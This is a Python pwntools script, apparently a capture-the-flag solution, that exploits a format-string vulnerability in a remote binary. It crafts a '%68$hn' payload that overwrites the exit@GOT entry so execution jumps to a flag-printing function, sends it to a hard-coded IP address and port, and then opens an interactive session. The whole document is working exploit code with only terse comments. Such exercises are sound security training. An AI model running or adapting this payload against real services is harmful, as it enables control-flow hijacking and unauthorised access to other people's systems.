# flag_func = 0x00000000004011b6
# vuln -> exit -> call 0x4010c0 -> jump to 0x2f6d
# 0x404038 <exit@got.plt>:        0x00401070

import struct 
import socket
import pwn

flag_func = 0x4011b6
EXIT_PLT = 0x404038
# vuln = 0x4011d4 
# EXIT_PLT = 0x8049724

def pad(s):
    return s+"X"*(512-len(s)-16)

exploit = ""
exploit += "AAAAAAAA"
exploit += "%{}x".format(0x11b6-len(exploit)) # address length
exploit += "%68$hn" # %hn to write address for two bytes, for 68 arguments

exploit = pad(exploit)
exploit += (struct.pack('Q', EXIT_PLT)).decode() # concat address behind due to x00

target_host = "140.113.207.240" 
target_port = 8854
conn = pwn.remote(target_host, target_port)
conn.recvuntil("Give me some goodies:")

conn.send(exploit+'\n')

conn.interactive()